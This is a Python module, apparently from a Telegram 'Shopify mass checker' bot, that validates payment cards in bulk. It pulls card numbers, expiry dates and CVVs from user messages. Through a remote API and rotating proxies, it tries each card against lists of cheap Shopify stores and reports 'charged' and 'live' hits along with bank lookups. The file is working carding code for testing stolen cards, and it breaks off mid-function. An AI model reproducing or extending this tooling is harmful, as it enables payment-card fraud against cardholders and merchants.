from __future__ import annotations
import asyncio, json as _json, logging, random, re, string, time, os
from datetime import datetime
from html import escape
from io import BytesIO
from typing import Optional
import aiohttp
from telegram import Update, InputFile, MessageEntity
from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes
from config import OWNER_ID, get_bin_info, tg_emoji, RawMarkup, _btn, BOT_NAME, CHANNEL_LINK

API_URL = "https://luci.up.railway.app/shopii"
BOT_CHANNEL = CHANNEL_LINK
DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">Superman</a>'
SECRET_CHANNEL_ID = -1004322090872
BOT_USERNAME_LINK = "https://t.me/superman8585_bot"
SH_COOLDOWN = 25
SITE_RETRIES = 20; SITE_TIMEOUT = 30; MAX_CONCURRENT = 25; CARD_STAGGER = 1.5; SITE_BATCH = 1; ROUND_DELAY = 0.5; CONSEC_TIMEOUT_MAX = 5; API_CONCURRENCY = 20; BUTTON_LOCK = 30
_CB_RESULT = "mshr"; _CB_STOP = "mshs"
MSH_SESSIONS = {}; _BIN_CACHE = {}; _DEAD_SITES = set(); _ALL_PROXIES = []
_PROXY_CACHE_TS = 0.0; _PROXY_CACHE_TTL = 300.0
_SITES_RAW_CACHE = []; _SITES_RAW_TS = 0.0; _SITES_RAW_TTL = 300.0
_WORKING_SITES = []; _PROBE_IN_PROGRESS = False; _PROBE_LAST_RUN = 0.0; _PROBE_TASK = None
PROBE_TTL = 1800.0; PROBE_CARD = "4000223372377978|05|29|651"; PROBE_TIMEOUT = 20.0; PROBE_CONCURRENCY = 60

CARD_EMOJI_ID = "5800709991627232190"; USER_EMOJI_ID = "6267115986541877538"; TIME_EMOJI_ID = "6285240160120477644"; DEV_EMOJI_ID = "6267091732861555879"; PRO_EMOJI_ID = "6280484433027931563"
DECLINED_EMOJI_ID = "4956612582816351459"; HIT_GATE_EMOJI_ID = "5341715473882955310"; HIT_RESP_EMOJI_ID = "5839116473951328489"
PROG_GATE_EMOJI_ID = "5370935802844946281"; PROG_PROGRESS_EMOJI_ID = "5116268964023894989"; PROG_CHARGED_EMOJI_ID = "5427168083074628963"; PROG_LIVE_EMOJI_ID = "6296367896398399651"; PROG_DEAD_EMOJI_ID = "4958526153955476488"; PROG_ERRORS_EMOJI_ID = "4956611513369494230"
SH_GATE_EMOJI_ID = "6220029508456548253"; SH_PROG_EMOJI_ID = "6298691319086712919"; SH_LIVE_EMOJI_ID = "6296367896398399651"
BTN_CHARGED_EMOJI_ID = "5465465194056525619"; BTN_LIVE_EMOJI_ID = "5039793437776282663"; BTN_ALL_EMOJI_ID = "4956324463525233747"; BTN_STOP_EMOJI_ID = "6179444193518162239"; CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"

CHARGED_EMOJI_IDS = ["5801154993188770160", "4956739572114392015", "5285221724634239278", "5287777298894835685", "5285024405246725814", "5287547831677112267", "5287658362660474522", "5285186510197381130", "5803233241963959320", "5462902520215002477", "5787435351521889877", "5323674506705785412", "5801005158959683238", "5436143465211640305", "5800688138833629633", "5891044423856296980", "5436068999068662274", "5427168083074628963"]
LIVE_EMOJI_IDS = ["6296367896398399651"]
PLAN_EMOJIS = {"CORE": "5379869575338812919", "ELITE": "5836898273666798437", "ROOT": "4956420911310832630", "CUSTOM": "5445027583588593750"}
SPECIAL_FONT_MAP = {'ᴀ':'A','ʙ':'B','ᴄ':'C','ᴅ':'D','ᴇ':'E','ꜰ':'F','ɢ':'G','ʜ':'H','ɪ':'I','ᴊ':'J','ᴋ':'K','ʟ':'L','ᴍ':'M','ɴ':'N','ᴏ':'O','ᴘ':'P','ǫ':'Q','ʀ':'R','ꜱ':'S','ᴛ':'T','ᴜ':'U','ᴠ':'V','ᴡ':'W','x':'X','ʏ':'Y','ᴢ':'Z','Ɪ':'I'}

def get_random_charged_emoji(): return random.choice(CHARGED_EMOJI_IDS)
def get_random_live_emoji(): return random.choice(LIVE_EMOJI_IDS)
def get_plan_emoji_id(plan_name):
    if not plan_name: return PRO_EMOJI_ID
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
    if norm in PLAN_EMOJIS: return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm: return v
    return PRO_EMOJI_ID

RETRY_ERRORS = ['r4 token empty','r2 id empty','clinte token','failed to get token','token not found','failed to get checkout','failed to get session token','failed to add to cart','could not extract receiptid','receiptid missing','response missing receiptid','missing receiptId','errmissingreceiptid','could not extract signedhandles','extract signedHandles','could not extract private_access_token','could not extract identification signature','could not extract session id','could not extract queuetoken','could not extract delivery handle','could not extract shipping amount','could not extract total amount','could not extract sessiontoken','could not find actions js url','missing stableid','missing buildid','missing sourcetoken','missing proposal','missing submit id','payment method is not shopify!','not shopify!','site not supported for now!','site not supported','site requires login!','site overloaded','site rate limited','application not found','store not found','app not found','store incompatible','errstoreincompatible','product not found','product id is empty','py id empty','no valid products','no available products found','NO_PRODUCTS','NO_PRODUCT','no_products','MERCHANDISE_OUT_OF_STOCK','products.json','INVENTORY_FAILURE','inventory_failure','retryable: inventory reservation failure','hcaptcha detected','hcaptcha_detected','DELIVERY_ZONE_NOT_FOUND','delivery_zone_not_found','DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE','delivery_no_delivery_strategy_available','DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE','delivery_no_delivery_strategy_available_for_merchandise_line','DELIVERY_DELIVERY_LINE_DETAIL_CHANGED','delivery_delivery_line_detail_changed','DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED','delivery_strategy_conditions_not_satisfied','DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION','delivery_out_of_stock_at_origin_location','SESSION_ERROR','session_error','receipt_empty','invalid_response','checkout_failed','VALIDATION_CUSTOM','validation_custom','VAULT_FAILED','exceeded 30 poll attempts','tax ammount empty','del ammount empty','site error! status: 401','site error! status: 402','site error! status: 403','site error! status: 404','site error! status: 429','site error! status: 500','site error! status: 502','site error! status: 503','site error! 503','site error','returned status 429','returned status 500','returned status 502','returned status 503','returned status 504','connection error','connection error!','could not resolve host','connect tunnel failed','proxy error','curl error','http error','timeout','step 0 failed','step 1 failed','step 2 failed','step 3 failed','step 4 failed','step 5 failed','step 6 failed','step 7 failed','step 8 failed','step 9 failed','step 10 failed','error processing card','PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED','payments_credit_card_brand_not_supported','BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP','buyer_identity_currency_not_supported_by_shop','BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN','unable to get payment token']
DECLINED_RESPONSES = ['CARD_DECLINED','PROCESSING_ERROR','GENERIC_DECLINE','DO NOT HONOR','DO_NOT_HONOR','UNKNOWN_ERROR','Processing Error','PICK_UP_CARD','DECISION_RULE_BLOCK','FRAUD_SUSPECTED','INVALID_PURCHASE_TYPE','INVALID_PAYMENT_METHOD','TEST_MODE_LIVE_CARD','AMOUNT_TOO_SMALL','INCORRECT_NUMBER','EXPIRED_CARD','STOLEN_CARD','LOST_CARD','RESTRICTED_CARD','TRANSACTION_NOT_ALLOWED']
SUCCESS_RESPONSES = ['INSUFFICIENT_FUNDS','INCORRECT_CVV','INCORRECT_CVC','INCORRECT_ZIP','INVALID_CVC','3DS_REQUIRED','ORDER_PAID','CARD_DECLINED','GENERIC_DECLINE','DO NOT HONOR','DO_NOT_HONOR','UNKNOWN_ERROR','Processing Error','PROCESSING_ERROR','GENERIC_ERROR','EXPIRED_CARD','PICK_UP_CARD','DECISION_RULE_BLOCK','FRAUD_SUSPECTED','AMOUNT_TOO_SMALL','INVALID_PURCHASE_TYPE','INVALID_PAYMENT_METHOD','TEST_MODE_LIVE_CARD','INCORRECT_NUMBER','RESTRICTED_CARD','STOLEN_CARD','LOST_CARD','TRANSACTION_NOT_ALLOWED']

def _is_dead_site_response(resp): return any(err.lower() in resp.lower().strip() for err in RETRY_ERRORS)
def _is_success_response(resp): return any(s.upper() in resp.upper().strip() for s in SUCCESS_RESPONSES)
def classify_response(resp):
    if not resp: return "RETRY"
    mu = resp.upper().strip(); ml = resp.lower().strip()
    if "ORDER_PAID" in mu or "PAYMENT_AUTHORIZED" in mu or "PAYMENT_ACCEPTED" in mu or "APPROVED" in mu or mu == "CHARGED": return "CHARGED"
    if "3DS_REQUIRED" in mu or "3D_SECURE" in mu or "AUTHENTICATION_REQUIRED" in mu or "SCA_REQUIRED" in mu: return "LIVE"
    if any(x in mu for x in ["INSUFFICIENT_FUNDS","INCORRECT_CVV","INCORRECT_CVC","INCORRECT_ZIP","INVALID_CVC","INVALID_CVV","PCI_ERROR","CVV_FAILED","AVS_FAILED","RISK_BLOCKED","SECURITY_VIOLATION","CALL_ISSUER","GENERIC_ERROR","TRANSFORMER_FINGERPRINT","FINGERPRINT","PCI","COMPLIANCE","CVV2","AVS","RISK","VELOCITY"]): return "LIVE"
    if any(d.upper() in mu for d in DECLINED_RESPONSES): return "DEAD"
    if any(r.lower() in ml for r in RETRY_ERRORS): return "RETRY"
    return "LIVE"

def _strip_proxy_scheme(p):
    for pfx in ("socks5://", "socks4://", "https://", "http://"):
        if p.startswith(pfx): return p[len(pfx):]
    return p

def _load_proxies():
    global _ALL_PROXIES, _PROXY_CACHE_TS
    now = time.time()
    if _ALL_PROXIES and (now - _PROXY_CACHE_TS) < _PROXY_CACHE_TTL: return list(_ALL_PROXIES)
    for fname in ("px.txt", "proxies.txt"):
        for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
            path = os.path.join(base, fname) if base else fname
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    raw = [l.strip() for l in f if l.strip() and not l.startswith(("#", "//", ";"))]
                if raw:
                    lines = [_strip_proxy_scheme(p) for p in raw]; _ALL_PROXIES = lines; _PROXY_CACHE_TS = time.time()
                    logging.info(f"[SH] {len(lines)} proxies loaded from {path}"); return lines
            except: pass
    logging.warning("[SH] No proxy file found — add px.txt with ip:port lines")
    _ALL_PROXIES = []; _PROXY_CACHE_TS = time.time(); return []

def _strip_scheme(url):
    url = url.strip()
    for pfx in ("https://", "http://", "www."):
        if url.startswith(pfx): url = url[len(pfx):]
    return url.rstrip("/")

def _load_sites():
    global _SITES_RAW_CACHE, _SITES_RAW_TS
    now = time.time()
    if _SITES_RAW_CACHE and (now - _SITES_RAW_TS) < _SITES_RAW_TTL:
        res = list(_SITES_RAW_CACHE); random.shuffle(res); return res
    for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
        path = os.path.join(base, "sites.txt") if base else "sites.txt"
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                raw = [_strip_scheme(l) for l in f if l.strip() and not l.startswith("#")]
            raw = [l for l in raw if l]
            if raw:
                _SITES_RAW_CACHE = raw; _SITES_RAW_TS = time.time(); res = list(raw); random.shuffle(res)
                logging.info(f"[SH] {len(res)} sites loaded from {path}"); return res
        except: pass
    raise RuntimeError("sites.txt not found or empty")

async def _probe_one_site(site, proxies):
    for _ in range(3):
        px = random.choice(proxies) if proxies else None
        try: resp, gw, price, curr, http_st = await _call_api(PROBE_CARD, site, px, timeout=PROBE_TIMEOUT)
        except: await asyncio.sleep(0.3); continue
        if http_st and http_st != 200: return False
        if gw.upper().strip() != "SHOPIFY PAYMENTS": return False
        if "ORDER_PAID" in resp.upper().strip() or resp.upper().strip() == "PAID": return False
        if _is_dead_site_response(resp): await asyncio.sleep(0.3); continue
        if _is_success_response(resp):
            try:
                p = float(re.sub(r"[^\d.]", "", str(price)))
                if p > 20.0: return False
            except: pass
            return True
        await asyncio.sleep(0.2)
    return False

async def probe_all_sites(all_sites, proxies, on_progress=None):
    global _WORKING_SITES, _PROBE_IN_PROGRESS, _PROBE_LAST_RUN
    if _PROBE_IN_PROGRESS: return _WORKING_SITES or all_sites
    _PROBE_IN_PROGRESS = True
    sem = asyncio.Semaphore(PROBE_CONCURRENCY); working = []; done_n = 0; total = len(all_sites); tasks = []
    async def _check_one(s):
        nonlocal done_n
        try:
            async with sem:
                try: r = await _probe_one_site(s, proxies)
                except: r = False
                done_n += 1
                if r: working.append(s)
                if on_progress and done_n % 50 == 0:
                    try: await on_progress(done_n, total)
                    except: pass
        except: pass
    try:
        tasks = [asyncio.ensure_future(_check_one(s)) for s in all_sites]
        await asyncio.gather(*tasks, return_exceptions=True)
    except: pass
    finally: _PROBE_IN_PROGRESS = False
    if working: _WORKING_SITES = working; _PROBE_LAST_RUN = time.time()
    elif not _WORKING_SITES: _WORKING_SITES = list(all_sites)
    return _WORKING_SITES

def get_working_sites(): return list(_WORKING_SITES) if _WORKING_SITES else _load_sites()

async def _auto_probe_loop(all_sites, proxies):
    try: await asyncio.sleep(5)
    except: return
    while True:
        try: await probe_all_sites(all_sites, proxies)
        except: pass
        try: await asyncio.sleep(PROBE_TTL)
        except: return

def start_probe_background(all_sites, proxies):
    global _PROBE_TASK
    _PROBE_TASK = asyncio.ensure_future(_auto_probe_loop(all_sites, proxies))

async def stop_probe_background():
    global _PROBE_TASK
    if _PROBE_TASK and not _PROBE_TASK.done():
        _PROBE_TASK.cancel()
        try: await asyncio.wait_for(asyncio.shield(_PROBE_TASK), timeout=6.0)
        except: pass
    _PROBE_TASK = None

def luhn_check(n):
    n = str(n).strip()
    if not n.isdigit(): return False
    t = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        t += d
    return t % 10 == 0

def is_expired(mm, yy):
    try:
        now = datetime.now(); ey, em = int(yy), int(mm)
        if ey < now.year % 100: return True
        if ey == now.year % 100 and em < now.month: return True
        return False
    except: return True

def extract_cards(text):
    pats = [r'(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})', r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})']
    seen, res = set(), []
    for p in pats:
        for m in re.findall(p, text):
            cc, mm, yy, cvv = m; mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen: seen.add(s); res.append(s)
    return res

def _parse_response_field(data):
    if data.get("Status") is True: return "ORDER_PAID"
    for k in ("Response", "response", "message", "Message", "result", "Result", "msg"):
        v = data.get(k)
        if v and isinstance(v, str) and v.strip():
            r = v.strip()
            if r.upper() == "ERROR": return "site error! status: 500"
            return r
    for k in ("error", "Error"):
        v = data.get(k)
        if v and isinstance(v, str) and v.strip(): return v.strip()
    return "CARD_DECLINED"

def _normalise_gateway(raw): return raw.replace("_", " ").replace("-", " ").strip().upper()

async def _call_api(card, site, proxy, timeout=SITE_TIMEOUT):
    site_clean = _strip_scheme(site)
    url = f"{API_URL}?cc={card}&site={site_clean}"
    _to = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
    try:
        async with aiohttp.ClientSession(timeout=_to) as sess:
            async with sess.get(url, ssl=False) as r:
                http_st = r.status; raw = await r.text()
                if not raw or not raw.strip(): return ("site error! status: 404", "Shopify Payments", "0.00", "USD", http_st)
                if http_st == 200:
                    try: data = _json.loads(raw)
                    except: return ("site error! status: 404", "Shopify Payments", "0.00", "USD", http_st)
                    gw = _normalise_gateway(str(data.get("Gateway") or "Shopify Payments"))
                    price = str(data.get("Price") or "0.00"); curr = str(data.get("Currency") or "USD")
                    return _parse_response_field(data), gw, price, curr, http_st
                _emap = {404:"site error! status: 404",403:"site error! status: 403",429:"site error! status: 429",500:"site error! status: 500",502:"site error! status: 502",503:"site error! status: 503",504:"timeout"}
                return (_emap.get(http_st, f"site error! status: {http_st}"), "Shopify Payments", "0.00", "USD", http_st)
    except asyncio.TimeoutError: return ("timeout", "Shopify Payments", "0.00", "USD", None)
    except asyncio.CancelledError: raise
    except Exception as e: return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)

async def _check_card_with_retry(_sess, card, sites, proxies, max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=""):
    if not sites:
        sites = get_working_sites()
        if not sites: sites = _load_sites()
    local_dead = set(); pool = list(sites); random.shuffle(pool)
    px_pool = list(proxies) if proxies else list(_ALL_PROXIES)
    tried = set(); price, curr = "0.00", "USD"; last_resp = "No sites responded"; consec_timeouts = 0; consec_api_errs = 0; attempt = 0
    async def _try_one(s, p):
        try: return s, await _call_api(card, s, p, timeout=site_timeout)
        except asyncio.CancelledError: raise
        except Exception as e: return s, (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
    def _pick_site():
        nonlocal pool
        skip = tried | local_dead; avail = [s for s in pool if s not in skip]
        if not avail: local_dead.clear(); tried.clear(); pool = list(sites); random.shuffle(pool); avail = pool[:]
        if not avail: return None
        s = random.choice(avail); tried.add(s); return s
    while attempt < max_sites:
        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED": raise asyncio.CancelledError()
        batch = []
        for _ in range(min(SITE_BATCH, max_sites - attempt)):
            s = _pick_site()
            if s and s not in batch: batch.append(s)
        if not batch: break
        attempt += len(batch)
        tasks = [asyncio.ensure_future(_try_one(s, random.choice(px_pool) if px_pool else None)) for s in batch]
        winner = None; batch_t = 0
        try:
            for fut in asyncio.as_completed(tasks):
                try: s, (resp, gw, price, curr, http_st) = await fut
                except: batch_t += 1; continue
                if resp == "timeout" or resp == "Timeout": batch_t += 1; local_dead.add(s); last_resp = resp; continue
                if http_st and http_st != 200:
                    local_dead.add(s); last_resp = f"HTTP {http_st}"
                    if http_st in (502, 503, 504): consec_api_errs += 1
                    else: consec_api_errs = 0
                    if consec_api_errs >= 5: return "DEAD", f"Gate API unavailable (HTTP {http_st})", price, curr
                    continue
                consec_api_errs = 0
                if http_st == 429 or (resp and "status: 429" in resp.lower()): tried.discard(s); continue
                cls = classify_response(resp); last_resp = resp
                if cls in ("CHARGED", "TDS", "LIVE", "DEAD"): winner = (cls, resp, price, curr); break
                local_dead.add(s)
        except asyncio.CancelledError:
            for t in tasks: t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True); raise
        finally:
            for t in tasks: t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
        if winner: return winner
        if batch_t == len(batch): consec_timeouts += batch_t
        else: consec_timeouts = 0
        if consec_timeouts >= CONSEC_TIMEOUT_MAX: return "DEAD", "timeout", price, curr
        await asyncio.sleep(ROUND_DELAY)
    if last_resp and _is_success_response(last_resp): return "LIVE", last_resp, price, curr
    return "DEAD", last_resp, price, curr

def _te(eid, fb="●"): return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
def _u16len(s): return len(s.encode("utf-16-le")) // 2

def html_to_entities(html):
    text = ""; ents = []; stack = []; i = 0; n = len(html)
    while i < n:
        ch = html[i]
        if ch == "<":
            j = html.index(">", i); tag = html[i+1:j]
            if tag.startswith("/"):
                tn = tag[1:].strip().lower()
                for k in range(len(stack)-1, -1, -1):
                    if stack[k]["name"] == tn:
                        e = stack.pop(k); st = e["offset"]; en = _u16len(text); l = en - st
                        if l > 0:
                            if tn == "b": ents.append(MessageEntity(type="bold", offset=st, length=l))
                            elif tn == "code": ents.append(MessageEntity(type="code", offset=st, length=l))
                            elif tn == "a": ents.append(MessageEntity(type="text_link", offset=st, length=l, url=e.get("url", "")))
                        break
                i = j + 1
            elif tag.lower().startswith("tg-emoji"):
                m = re.search(r'emoji-id="([^"]+)"', tag)
                if m:
                    eid = m.group(1); ci = html.index("</tg-emoji>", j+1); fb = html[j+1:ci]; off = _u16len(text); text += fb; l = _u16len(fb)
                    if l > 0: ents.append(MessageEntity(type="custom_emoji", offset=off, length=l, custom_emoji_id=eid))
                    i = ci + len("</tg-emoji>")
                else: i = j + 1
            else:
                tn = tag.split()[0].lower() if tag else ""
                e = {"name": tn, "offset": _u16len(text)}
                if tn == "a":
                    m = re.search(r'href=["\']([^"\']+)["\']', tag)
                    if m: e["url"] = m.group(1)
                stack.append(e); i = j + 1
        elif ch == "&":
            if html[i:i+4] == "&lt;": text += "<"; i += 4
            elif html[i:i+4] == "&gt;": text += ">"; i += 4
            elif html[i:i+5] == "&amp;": text += "&"; i += 5
            elif html[i:i+6] == "&quot;": text += '"'; i += 6
            else: text += ch; i += 1
        else: text += ch; i += 1
    return text, ents if ents else None

class MsgBuilder:
    __slots__ = ("_txt", "_ents")
    def __init__(self): self._txt = ""; self._ents = []
    @staticmethod
    def _u16(s): return len(s.encode("utf-16-le")) // 2
    def raw(self, s):
        if s: self._txt += s
        return self
    def bold(self, s):
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="bold", offset=o, length=l))
        return self
    def code(self, s):
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="code", offset=o, length=l))
        return self
    def link(self, d, u):
        if not d: return self
        o = self._u16(self._txt); l = self._u16(d); self._txt += d
        if l: self._ents.append(MessageEntity(type="text_link", offset=o, length=l, url=u))
        return self
    def emoji(self, eid, fb):
        if not fb: return self
        o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
        if l: self._ents.append(MessageEntity(type="custom_emoji", offset=o, length=l, custom_emoji_id=eid))
        return self
    def bold_emoji(self, eid, fb):
        if not fb: return self
        o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
        if l:
            self._ents.append(MessageEntity(type="bold", offset=o, length=l))
            self._ents.append(MessageEntity(type="custom_emoji", offset=o, length=l, custom_emoji_id=eid))
        return self
    def bold_link(self, d, u):
        if not d: return self
        o = self._u16(self._txt); l = self._u16(d); self._txt += d
        if l:
            self._ents.append(MessageEntity(type="bold", offset=o, length=l))
            self._ents.append(MessageEntity(type="text_link", offset=o, length=l, url=u))
        return self
    def italic(self, s):
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="italic", offset=o, length=l))
        return self
    def mention(self, u):
        if not u: return self
        o = self._u16(self._txt); l = self._u16(u); self._txt += u
        if l: self._ents.append(MessageEntity(type="mention", offset=o, length=l))
        return self
    def nl(self, n=1): self._txt += "\n" * n; return self
    def build(self): return self._txt, self._ents if self._ents else None

async def _get_sticker_fid(bot, eid): return None
async def _send_sticker(bot, cid, eid): pass

async def _send_as_media(bot, cid, eid, caption, parse_mode="HTML", reply_markup=None, disable_notification=False, reply_to_message_id=None):
    try:
        full_html = f'<b><tg-emoji emoji-id="{eid}">⭐</tg-emoji></b>\n{caption}' if eid else caption
        pt, ents = html_to_entities(full_html)
        await bot.send_message(chat_id=cid, text=pt, entities=ents if ents else None, reply_markup=reply_markup, disable_web_page_preview=True, disable_notification=disable_notification, reply_to_message_id=reply_to_message_id)
    except Exception as ex: logging.warning(f"[MEDIA] send_message to {cid} failed: {ex}")

def _plan_eid(plan):
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
    if norm in PLAN_EMOJIS: return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm: return v
    return PRO_EMOJI_ID

def _user_link(u):
    n = escape(getattr(u, "first_name", None) or "User")
    if getattr(u, "username", None): return f'<a href="https://t.me/{u.username}">{n}</a>'
    return f'<a href="tg://user?id={u.id}">{n}</a>'

def _fmt_time(s):
    s = int(s)
    return f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"

def _fmt_price(p, c):
    try:
        v = float(re.sub(r"[^\d.]", "", p or ""))
        if v > 0: return f"{v:.2f} {escape(c)}"
    except: pass
    return "0.00 USD"

def _is_premium(ud, uid): return (uid == OWNER_ID or ud.get("premium", False) or ud.get("plan") not in (None, "TRIAL"))

def _get_ud(uid, ctx):
    ud = ctx.bot_data.setdefault("user_data", {}); k = str(uid)
    if k not in ud:
        from datetime import datetime as _dt
        ud[k] = {"name":"User","first_name":"User","last_name":"","username":"","language_code":"en","joined":_dt.now().strftime("%Y-%m-%d %H:%M"),"last_active":_dt.now().strftime("%Y-%m-%d %H:%M"),"credits":150,"plan":"TRIAL","expires":0,"pre_premium_credits":0,"total_refs":0,"total_checks":0,"approved_checks":0,"declined_checks":0,"last_gate":"N/A","last_card":"N/A","codes_redeemed":0,"keys_redeemed":0,"banned":False,"total_charged":0}
    return ud[k]

def _sid(): return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

def _get_flag(alpha2):
    if not alpha2 or len(alpha2) != 2: return "🌍"
    return "".join(chr(0x1F1E6 + ord(c) - ord('A')) for c in alpha2.upper())

async def _fetch_bin_direct(bin6: str) -> dict:
    sources = [
        {"url": f"https://data.handyapi.com/bin/{bin6}", "parse": lambda d: {"scheme": (d.get("Scheme") or "").upper(), "bank": d.get("Issuer") or "", "country": (d.get("Country") or {}).get("Name", ""), "country_code": (d.get("Country") or {}).get("A2", "")}},
        {"url": f"https://lookup.binlist.net/{bin6}", "parse": lambda d: {"scheme": (d.get("scheme") or "").upper(), "bank": (d.get("bank") or {}).get("name", ""), "country": (d.get("country") or {}).get("name", ""), "country_code": (d.get("country") or {}).get("alpha2", "")}},
    ]
    _to = aiohttp.ClientTimeout(total=10, connect=5)
    for src in sources:
        try:
            async with aiohttp.ClientSession(timeout=_to, headers={"User-Agent": "Mozilla/5.0"}) as s:
                async with s.get(src["url"], ssl=False) as r:
                    if r.status != 200: continue
                    try: data = await r.json(content_type=None)
                    except: continue
                    info = src["parse"](data)
                    if info.get("scheme") and (info.get("bank") or info.get("country")):
                        info["country_emoji"] = _get_flag(info.get("country_code", ""))
                        return info
        except: continue
    return {}

async def _bin_lookup(bin6: str) -> dict:
    if bin6 in _BIN_CACHE: return _BIN_CACHE[bin6]
    result = {}
    try: result = await asyncio.wait_for(_fetch_bin_direct(bin6), timeout=10)
    except: pass
    if not result or not result.get("scheme"):
        try: result = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
        except: result = {}
    if result and not result.get("country_emoji"):
        result["country_emoji"] = _get_flag(result.get("country_code", ""))
    _BIN_CACHE[bin6] = result
    return result

def _bin_str_plain(bd: dict) -> str:
    def _g(*keys):
        for k in keys:
            v = bd.get(k)
            if v and str(v).strip() not in ("", "None", "N/A", "null", "UNKNOWN"): return str(v).strip()
        return "N/A"
    scheme = _g("scheme", "brand", "card_scheme", "network").upper()
    bank = _g("bank", "bank_name", "issuer", "issuer_name")
    country = _g("country", "country_name", "country_full")
    flag = bd.get("country_emoji", "🌍")
    cstr = f"{flag} {country}".strip()
    return f"{scheme} - {bank} - {cstr}"

def build_result_msg(card, resp, verdict, bin_data, price, currency, elapsed, user, plan):
    ulink = _user_link(user); ts = _fmt_time(elapsed); bin_s = escape(_bin_str_plain(bin_data))
    raw_resp = resp or "Unknown"; safe_resp = escape(raw_resp)
    ch_link = f'<a href="{CHANNEL_LINK}">Superman</a>'
    if verdict == "CHARGED":
        status_line = "✦ <b>𝗛𝗜𝗧 𝗖𝗛𝗔𝗥𝗚𝗘𝗗</b> ✦"; gate_line = f"Shopify • {_fmt_price(price, currency)}"
    elif verdict == "TDS":
        status_line = "✦ <b>𝗛𝗜𝗧 𝗟𝗜𝗩𝗘 [3𝗗𝗦]</b> ✦"; gate_line = "Shopify"
    elif verdict == "LIVE":
        status_line = "✦ <b>𝗛𝗜𝗧 𝗟𝗜𝗩𝗘</b> ✦"; gate_line = "Shopify"
    else:
        status_line = "✦ <b>𝗗𝗘𝗔𝗗 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗</b> ✦"; gate_line = "Shopify"
    return f"{status_line}\n━━━━━━━━━━━━━━━━━━━━\n💳 <b>𝗖𝗮𝗿𝗱</b>: <code>{escape(card)}</code>\n🛒 <b>𝗚𝗮𝘁𝗲</b>: {gate_line}\n━━━━━━━━━━━━━━━━━━━━\n✅ <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲</b>: {safe_resp}\n🏦 <b>𝗕𝗜𝗡</b>: {bin_s}\n━━━━━━━━━━━━━━━━━━━━\n⏱ <b>𝗧𝗶𝗺𝗲</b>: {ts}\n👤 <b>𝗨𝘀𝗲𝗿</b>: {ulink}\n⚡ <b>𝗕𝗼𝘁</b>: {ch_link}"

def _progress_text(sess: dict) -> str:
    ts = _fmt_time(time.time() - sess["start_time"])
    uobj = sess.get("user_obj")
    ulink = _user_link(uobj) if uobj else "User"
    ch_link = f'<a href="{CHANNEL_LINK}">Superman</a>'
    return f"✦ <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗘𝗥</b> ✦\n━━━━━━━━━━━━━━━━━━━━\n🛒 <b>𝗚𝗮𝘁𝗲</b>:  Shopify\n🔄 <b>𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀</b>: {sess['checked']} / {sess['total']}\n━━━━━━━━━━━━━━━━━━━━\n✅ <b>𝗟𝗶𝘃𝗲</b>:  {sess['approved']}\n❌ <b>𝗗𝗲𝗮𝗱</b>:  {sess['dead']}\n💎 <b>𝗖𝗵𝗮𝗿𝗴𝗲𝗱</b>: {sess['charged']}\n⚠️ <b>𝗘𝗿𝗿𝗼𝗿𝘀</b>: {sess['errors']}\n⏱ <b>𝗘𝗹𝗮𝗽𝘀𝗲𝗱</b>: {ts}\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>𝗨𝘀𝗲𝗿</b>: {ulink}\n⚡ <b>𝗕𝗼𝘁</b>: {ch_link}"

def _msh_buttons(sid: str, running: bool) -> RawMarkup:
    sess = MSH_SESSIONS.get(sid, {}); charged_n = sess.get("charged", 0); live_n = sess.get("approved", 0); all_n = sess.get("checked", 0)
